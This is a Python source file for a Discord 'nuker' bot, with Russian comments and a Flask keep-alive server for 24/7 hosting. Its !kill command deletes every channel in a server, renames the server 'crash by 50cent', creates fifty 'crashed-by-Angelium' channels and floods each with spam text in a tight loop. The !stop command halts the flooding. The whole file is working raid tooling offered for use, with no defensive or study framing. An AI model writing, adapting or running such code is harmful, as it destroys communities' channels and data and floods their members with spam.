import discord
from discord.ext import commands
import asyncio
import os
from flask import Flask
from threading import Thread

# ===== KEEP ALIVE ДЛЯ 24/7 =====
app = Flask('')

@app.route('/')
def home():
    return "✅ Бот Flood Community жив!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()
# ===== КОНЕЦ KEEP ALIVE =====

PREFIX = "!"
TOKEN = os.getenv("DISCORD_TOKEN", input("Bot Token -> "))  # Сначала пробует переменную, потом запрос
NEW_NAME = "crash by 50cent"

def load_spam_text():
    if os.path.exists("spam.txt"):
        with open("spam.txt", "r", encoding="utf-8") as f:
            content = f.read()
            if content.strip():
                return content
    return "SPAM"

spam_text = load_spam_text()
spamming = False
created_channel_ids = []

print(f"[Бот будет отправлять]: {spam_text[:100]}..." if len(spam_text) > 100 else f"[Бот будет отправлять]: {spam_text}")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    print(f"Спам-текст загружен из spam.txt")

async def spam_channel(channel):
    global spamming
    while spamming:
        try:
            await channel.send(spam_text)
        except discord.Forbidden:
            pass
        except:
            pass
        await asyncio.sleep(0.05)

async def delete_all_channels(guild):
    tasks = []
    for channel in guild.channels:
        tasks.append(asyncio.create_task(channel.delete()))
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
async def kill(ctx):
    global spamming
    global created_channel_ids

    await ctx.message.delete()
    guild = ctx.guild

    await delete_all_channels(guild)

    try:
        await guild.edit(name=NEW_NAME)
    except:
        pass

    created_channel_ids.clear()
    spamming = True

    everyone_role = guild.default_role
    overwrites = {
        everyone_role: discord.PermissionOverwrite(
            view_channel=True,
            read_messages=True,
            send_messages=True
        )
    }

    tasks = []
    for i in range(50):
        task = asyncio.create_task(guild.create_text_channel(name="crashed-by-Angelium", overwrites=overwrites))
        tasks.append(task)

    channels = await asyncio.gather(*tasks, return_exceptions=True)

    for channel in channels:
        if isinstance(channel, discord.TextChannel):
            created_channel_ids.append(channel.id)
            asyncio.create_task(spam_channel(channel))

    print(f"[KILL] Сервер {guild.name} уничтожен. Создано {len(created_channel_ids)} каналов")

@bot.command()
async def stop(ctx):
    global spamming
    global created_channel_ids

    await ctx.message.delete()
    spamming = False
    await asyncio.sleep(0.5)

    guild = ctx.guild
    for channel_id in created_channel_ids:
        channel = guild.get_channel(channel_id)
        if channel:
            try:
                await channel.delete()
            except:
                pass
    created_channel_ids.clear()

    await ctx.send("✅ **STOPPED** ✅", delete_after=2)
    print(f"[STOP] Бот остановлен на сервере {guild.name}")

# ЗАПУСКАЕМ ВЕБ-СЕРВЕР (ДЛЯ RENDER)
keep_alive()

# ЗАПУСКАЕМ БОТА
bot.run(TOKEN)